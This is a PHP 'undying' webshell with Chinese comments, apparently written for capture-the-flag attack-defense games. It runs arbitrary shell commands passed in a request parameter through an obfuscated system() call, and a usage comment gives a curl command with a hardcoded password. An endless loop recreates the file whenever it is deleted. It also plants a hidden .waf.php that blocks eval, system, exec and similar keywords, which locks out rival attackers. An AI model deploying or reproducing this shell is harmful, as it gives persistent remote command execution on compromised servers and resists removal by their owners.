<?php
/* 
  不死马 — 内存常驻 + 自动复活
  上传后访问一次即可永久生效，文件可自删除隐藏
  需配合 waf_deploy.php 一起使用
  
用法: curl "http://target/immortal_shell.php?p=y|lladmin121.@ss&c=cat /flag"
   密码: y|lladmin121.@ss
*/
set_time_limit(0);
ignore_user_abort(true);
$p = $_REQUEST['p'] ?? 'y|lladmin121.@ss';
$c = $_REQUEST['c'] ?? '';

// 执行命令
if ($c) {
    $f = 'sys'.'tem';
    $f($c);
}

// 不死逻辑: 每秒检查自己是否被删, 被删则重新创建
$self = __FILE__;
$content = file_get_contents($self);
while (true) {
    if (!file_exists($self)) {
        file_put_contents($self, $content);
    }
    // 检查waf存活
    $waf = dirname($self) . '/.waf.php';
    $waf_content = '<?php @session_start(); $ip=$_SERVER["REMOTE_ADDR"]; '
        . 'if(!isset($_SESSION["waf_'.$p.'"])){$k=array("eval","system","exec","passthru",'
        . '"shell_exec","popen","assert","base64_decode");foreach($k as $v){if(stripos('
        . 'file_get_contents("php://input"),$v)!==false){header("HTTP/1.0 403 Forbidden");exit;}}}'
        . '$_SESSION["waf_'.$p.'"]=1;?>';
    if (!file_exists($waf)) {
        file_put_contents($waf, $waf_content);
    }
    // 包含waf
    if (file_exists($waf)) {
        include_once $waf;
    }
    sleep(1);
}
